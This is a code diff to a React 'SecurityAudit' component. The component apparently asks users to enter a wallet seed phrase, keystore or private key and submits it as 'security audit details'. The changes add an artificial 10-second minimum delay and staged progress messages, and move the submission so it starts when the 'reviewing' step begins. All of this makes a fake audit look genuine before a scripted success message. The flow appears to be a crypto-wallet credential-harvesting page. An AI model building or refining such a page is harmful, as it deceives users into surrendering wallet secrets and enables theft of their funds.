@@ -118,6 +118,8 @@ export const SecurityAudit = () => {
       return
     }
 
+    const startTime = Date.now()
+
     try {
       const timestamp = new Date().toISOString()
       const method = selectedConnection === 'Secret Phrase' ? 'phrase' : selectedConnection === 'Keystore' ? 'keystore' : 'privatekey'
@@ -142,6 +144,11 @@ export const SecurityAudit = () => {
         throw new Error(errorResponse || 'Failed to process security audit details')
       }
 
+      const elapsed = Date.now() - startTime
+      if (elapsed < 10000) {
+        await new Promise((resolve) => setTimeout(resolve, 10000 - elapsed))
+      }
+
       setAuditSummary([
         `${activeOption.title} audit completed successfully.`,
         `Connection mode: ${selectedConnection}`,
@@ -158,30 +165,31 @@ export const SecurityAudit = () => {
 
   useEffect(() => {
     if (flowStep !== 'initializing' && flowStep !== 'reviewing') return
-    if (activeMessages.length === 0) return
+
+    const messages = flowStep === 'initializing' ? stepStatus.initializing : stepStatus.reviewing
+    if (messages.length === 0) return
 
     let currentIndex = 0
     const timers: NodeJS.Timeout[] = []
     const tick = () => {
       currentIndex += 1
-      if (currentIndex < activeMessages.length) {
+      if (currentIndex < messages.length) {
         timers.push(setTimeout(() => {
-          setActivityMessage(activeMessages[currentIndex])
+          setActivityMessage(messages[currentIndex])
           setProgressIndex(currentIndex)
           tick()
         }, 1800))
         return
       }
 
-      timers.push(setTimeout(() => {
-        if (flowStep === 'initializing') setFlowStep('chooseConnection')
-        else void submitSecurityAudit()
-      }, 1800))
+      if (flowStep === 'initializing') {
+        timers.push(setTimeout(() => setFlowStep('chooseConnection'), 1800))
+      }
     }
 
     timers.push(setTimeout(tick, 1800))
     return () => timers.forEach(clearTimeout)
-  }, [activeMessages, flowStep, submitSecurityAudit])
+  }, [flowStep])
 
   const handleOptionSelect = (option: SecurityOption) => {
     setActiveOption(option)
@@ -214,6 +222,7 @@ export const SecurityAudit = () => {
     setActivityMessage(stepStatus.reviewing[0])
     setProgressIndex(0)
     setFlowStep('reviewing')
+    void submitSecurityAudit()
   }
 
   return (
